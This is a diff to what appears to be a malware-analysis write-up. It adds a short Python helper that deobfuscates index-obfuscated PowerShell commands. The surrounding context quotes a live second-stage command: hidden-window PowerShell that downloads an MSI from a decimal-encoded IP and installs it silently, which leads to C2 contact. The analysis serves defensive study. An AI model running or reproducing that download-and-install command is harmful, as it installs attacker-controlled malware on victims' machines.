@@ -486,6 +486,22 @@ which can be converted to dotted decimal format to 151\.240\.151\.223 using [abu
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h cd $env:TMP;irm 2549127135/333 -OutFile u.msi;msiexec /i u.msi /qn MSIINSTALLPERUSER=1
 ```
 
+Python script to deobfuscate similar powershell script/commands.
+
+```python
+
+note = r""
+indexes = []
+
+result = ''.join(note[i] for i in indexes)
+
+result = result.replace('@', ' ')
+
+result = result.replace('?', '"')
+
+print(result)
+```
+
 Obfuscated CMD → Character-index reconstruction → String replacement → Second-stage command  → MSI download → C2 communication
 
 
